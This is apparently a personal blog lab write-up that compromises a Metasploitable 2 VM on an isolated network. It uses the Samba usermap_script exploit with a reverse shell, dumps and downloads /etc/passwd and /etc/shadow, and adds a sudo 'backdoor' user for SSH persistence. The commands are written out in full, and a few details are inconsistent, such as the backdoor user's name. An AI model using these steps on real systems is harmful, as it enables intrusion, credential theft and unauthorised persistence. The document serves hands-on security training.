---
title: "Compromising metasploitable"
excerpt: "building my own attack and training environment. ain unauthorized access to a vulnerable Metasploitable 2 machine, extract sensitive data, and establish a persistent backdoor"
date: 2025-09-15
tags: [metasploitable, reconaissance, exploitation, post-exploitation, persistence]
layout: single
author_profile: true
---

#### Lab network setup
we do this to Isolate both VMs on a private network where they can communicate, without risking your real network

**1. Create a Host-Only Network in VirtualBox:**
VirtualBox Manager -> File -> Preferences -> Network -> Host-Only Networks -> Click the green "+" icon to create a new network (e.g., vboxnet0).
**2. Configure VM Network Settings:**
For both Kali and Metasploitable 2 VMs:
Settings -> Network -> Adapter 1 -> Attached to: Host-Only Adapter
Name: Select the newly created adapter (e.g., vboxnet0).
Optional: Add a second adapter set to NAT to the Kali VM to give it internet access.

#### 2. Reconnaissance
To discover the target, metasploitable , and its vulnerabilities
login into metasploit using username and password as msfadmin, type **ifconfig** and check inet t see the ip, do the same for kali.
In this case the host IP, kali is 192.168.56.102 and for metasploitable, Remote host 192.168.56.101
perform a port scna using nmap -Pn -sV -A -O 192.168.56.101. The scan reveals an old version of samba on port 445 which is vulnerable to  the Usermap_script exploit
![Topography Image](/assets/images/recon.png)

#### 3. Exploiting using metasploit
launch metasploit **msfconsole -q**
**search samba** to see possible exploits, in this case we will exploit using **search usermap_script** and so we will use **use exploit/multi/samba/usermap_script** exploit. Run that in msf
run **show options** to see what need to be set ie RHOST and LHOST
![Topography Image](/assets/images/msf.png)

Configure the required exploit parameters
**set RHOSTS 192.168.56.101   # (Remote Host) The target IP**
**set LHOST 192.168.56.102    # (Local Host) Your Kali IP**
Set a reliable payload, the default payload can be unstable. use a more robust one ie **set PAYLOAD cmd/unix/reverse_openssl**
![Topography Image](/assets/images/set.png)
Exploit
![Topography Image](/assets/images/exploit.png)
Handle the Session: The exploit will run and open a command shell session. It may seem to hang
Press Ctrl+Z to background the session
Type y to confirm
You are now back at the msf6 prompt. Your session is active in the background.

#### Post-explotation
We want to make sure to Explore the compromised system, loot data, and ensure you can get back in.
 To list all active sessions, we **sessions -l** after the ctrl+z above. Note the Id
 Then do a session interact **sessions -i 1** and we are in
![Topography Image](/assets/images/inside.png)
 You can try things like whoami, id
 # What is the operating system?
cat /etc/issue
uname -a
# Shows Linux kernel version
# What is in the current directory?
ls -la
# What users are on the system?
cat /etc/passwd
# What is the network configuration?
ifconfig

we now look for sensitive files, tese are key places to check
# 1. Look for files in the user home directories
ls -la /home
ls -la /home/*
# 2. Check the /root directory (root user's home)
ls -la /root
# 3. Look for configuration files with passwords
cat /etc/passwd
cat /etc/shadow  # This file contains password hashes. You can try to crack them later.
# 4. Check the web server root (if it has a website)
ls -la /var/www

Download Sensitive Files: Background the session (Ctrl+Z -> y) and use Metasploit's download command from the msf6 prompt.
download /etc/passwd /home/[YourKaliUser]/passwd.txt
download /etc/shadow /home/[YourKaliUser]/shadow.txt
![Topography Image](/assets/images/download.png)

#### Persistence
We are determined to Create a reliable, long-term access method that doesn't depend on the initial exploit.
To do tis,  
1. Interact with your session again (sessions -i 1).
2. Create a New User:
useradd -m -s /bin/bash backdoor  # Creates user 'backdoor1' with a home directory
passwd backdoor                   # Set the password for the new user (e.g., 'backdoor')
usermod -aG sudo backdoor         # Adds the user to the sudo group (root privileges)
![Topography Image](/assets/images/backdoor.png)

And the backdoor will be successfully created. Now in a new kali terminal, try to access it by **ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.101** and put the pasword
![Topography Image](/assets/images/ssh.png)
 




